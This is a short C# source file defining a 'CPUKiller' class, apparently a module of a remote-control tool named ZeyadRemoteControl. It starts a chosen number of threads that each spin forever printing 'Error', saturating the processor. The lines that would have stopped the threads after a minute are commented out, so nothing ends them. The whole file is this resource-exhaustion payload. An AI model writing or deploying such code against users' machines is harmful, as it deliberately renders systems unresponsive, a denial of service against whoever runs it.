using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ZeyadRemoteControl.Killers
{
       public class CPUKiller
        {
            int Count;
            public CPUKiller(int Threads)
            {
                Count = Threads;
            }

            public void Start()
            {
                List<Thread> u = new List<Thread>();
                for (int x = 0; x < Count; x++)
                {
                    Thread y = new Thread(delegate () { while (1 < Count) { Console.WriteLine("Error"); } });
                    u.Add(y);
                    y.Start();
                }
                //Thread.Sleep(60000);
                //foreach (var i in u)
                //{
                //    i.Abort();
                //}
            }
        }
    
}
